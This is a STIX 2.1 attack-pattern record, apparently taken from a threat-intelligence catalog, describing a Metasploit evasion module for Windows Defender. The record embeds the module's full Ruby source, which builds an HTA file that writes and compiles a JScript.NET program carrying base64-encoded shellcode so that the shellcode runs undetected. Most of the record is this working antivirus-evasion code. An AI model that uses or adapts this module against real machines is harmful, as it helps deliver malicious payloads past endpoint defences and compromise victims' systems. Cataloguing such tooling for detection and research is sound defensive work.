{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0da2be82-cfc1-4740-9b46-62cfdfbedb86",
    "created": "2024-08-14T16:33:19.192698Z",
    "modified": "2024-08-14T16:33:19.192702Z",
    "name": "Microsoft Windows Defender Evasive JS.Net and HTA",
    "description": " This module will generate an HTA file that writes and compiles a JScript.NET file containing shellcode on the target machine. After compilation, the generated EXE will execute the shellcode without interference from Windows Defender.  It is recommended that you use a payload that uses RC4 or HTTPS for best experience. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/evasion/windows/windows_defender_js_hta.rb",
            "external_id": "windows_defender_js_hta.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Evasion\n\n  def initialize(info={})\n    super(merge_info(info,\n      'Name'        =>  'Microsoft Windows Defender Evasive JS.Net and HTA',\n      'Description' =>  %q{\n        This module will generate an HTA file that writes and compiles a JScript.NET file\n        containing shellcode on the target machine. After compilation, the generated EXE will\n        execute the shellcode without interference from Windows Defender.\n\n        It is recommended that you use a payload that uses RC4 or HTTPS for best experience.\n      },\n      'Author'      =>\n        [\n          'sinmygit',    # PoC\n          'Shelby Pace'  # Metasploit Module\n        ],\n      'License'     =>  MSF_LICENSE,\n      'Platform'    =>  'win',\n      'Arch'        =>  ARCH_X64,\n      'Targets'     =>  [ [ 'Microsoft Windows', {} ] ]\n    ))\n\n    register_options([\n      OptString.new(\n        'FILENAME',\n          [\n            true,\n            'Filename for the evasive file (default: random)',\n            \"#{Rex::Text.rand_text_alpha(3..10)}.hta\"\n          ])\n    ])\n  end\n\n  def run\n    # This is used in the ERB template\n    file_payload = Rex::Text.encode_base64(payload.encoded)\n    evasion_shellcode_path = File.join(Msf::Config.data_directory, 'exploits', 'evasion_shellcode.js')\n    jsnet_code = File.read(evasion_shellcode_path)\n    fail_with(Failure::NotFound, 'The JScript.NET file was not found.') unless File.exist?(evasion_shellcode_path)\n    js_file = ERB.new(jsnet_code).result(binding())\n    jsnet_encoded = Rex::Text.encode_base64(js_file)\n    # This is used in the ERB template\n    fname = Rex::Text.rand_text_alpha(6)\n    arch = [\"x86\", \"x64\"].include?(payload.arch.first) ? payload.arch.first : \"anycpu\"\n    hta_path = File.join(Msf::Config.data_directory, 'exploits', 'hta_evasion.hta')\n    hta = File.read(hta_path)\n    fail_with(Failure::NotFound, 'The HTA file was not found.') unless File.exist?(hta_path)\n    hta_file = ERB.new(hta).result(binding())\n    file_create(hta_file)\n  end\nend\n",
    "x_mitre_platforms": [
        "win'"
    ]
}